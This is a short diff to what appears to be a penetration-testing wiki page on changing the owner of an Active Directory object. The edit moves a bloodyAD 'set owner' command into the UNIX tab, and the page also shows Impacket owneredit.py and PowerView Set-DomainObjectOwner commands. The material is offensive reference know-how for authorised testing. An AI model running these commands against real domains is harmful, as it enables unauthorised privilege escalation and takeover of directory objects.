@@ -13,6 +13,12 @@ From UNIX-like systems, this can be done with [Impacket](https://github.com/Secu
 ```bash
 owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'
 ```
+
+Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
+```bash
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner $TargetObject $ControlledPrincipal
+```
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -20,13 +26,6 @@ From Windows systems, this can be achieved with [Set-DomainObjectOwner](https://
 
 ```bash
 Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
-```
-{% endtab %}
-
-{% tab title="Windows/Linux" %}
-It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
-```bash
-bloodyAD --host $DomainController -d $DOMAIN -u $ControlledUser -p $Password set owner $TargetObject $ControlledPrincipal
 ```
 {% endtab %}
 
